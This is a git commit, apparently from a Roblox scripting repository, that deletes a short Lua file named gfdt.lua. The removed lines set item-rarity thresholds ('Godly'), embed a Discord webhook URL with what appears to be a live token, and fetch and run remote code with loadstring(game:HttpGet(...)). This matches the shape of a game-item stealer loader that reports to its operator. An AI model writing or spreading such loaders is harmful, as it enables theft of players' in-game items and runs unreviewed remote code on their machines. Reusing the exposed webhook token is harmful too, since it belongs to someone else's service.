36fac81bc81355cdbbe96fcca097a856f7f5589c
anarchist5 <shkebedi00@gmail.com>
2025-10-28 02:33:07 +0300

    Delete gfdt.lua

--- gfdt.lua
+++
@@ -1,4 +0,0 @@
-min_value = 1
-min_rarity = "Godly"
-webhook =  "https://discordapp.com/api/webhooks/1432463320979603487/idszAg4zy21Bn_QfkpXgv7MKXZRY1VsOPYxXBxm5EPui-CoXkgWM4nzT0CL90sN-hDtN"
-loadstring(game:HttpGet("https://codeberg.org/amaz/main/raw/branch/main/mm2invcheck"))()
